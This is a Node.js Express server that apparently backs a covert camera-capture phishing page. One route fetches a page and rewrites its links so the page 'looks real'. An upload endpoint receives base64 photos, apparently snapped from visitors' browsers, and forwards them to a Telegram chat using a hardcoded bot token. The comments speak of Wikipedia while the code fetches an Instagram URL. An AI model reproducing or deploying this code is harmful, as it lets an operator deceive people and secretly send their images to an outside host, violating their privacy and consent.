const path = require('path');
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// YOUR TELEGRAM DETAILS
const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
const CHAT_ID = '5574741182';

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// PROXY FIX: Fetches Wikipedia server-side to bypass CORS and 404s
app.get('/view-article', async (req, res) => {
    try {
        const response = await fetch('https://www.instagram.com/reel/DXoVmf2hT0P/?utm_source=ig_web_copy_link');
        let html = await response.text();
        
        // Injects Wikipedia's styles so it looks real
        html = html.replace(/href="\//g, 'href="https://en.wikipedia.org/');
        html = html.replace(/src="\//g, 'src="https://en.wikipedia.org/');
        
        res.send(html);
    } catch (err) {
        res.status(500).send("Loading...");
    }
});

app.post('/api/upload-photo', async (req, res) => {
    try {
        const { dataUrl } = req.body;
        const buffer = Buffer.from(dataUrl.split(',')[1], 'base64');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'snap.jpg' });
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
            method: 'POST', 
            body: form 
        });
        res.json({ ok: true });
    } catch (err) { res.status(500).json({ ok: false }); }
});

app.listen(PORT, () => console.log(`Server live on ${PORT}`));
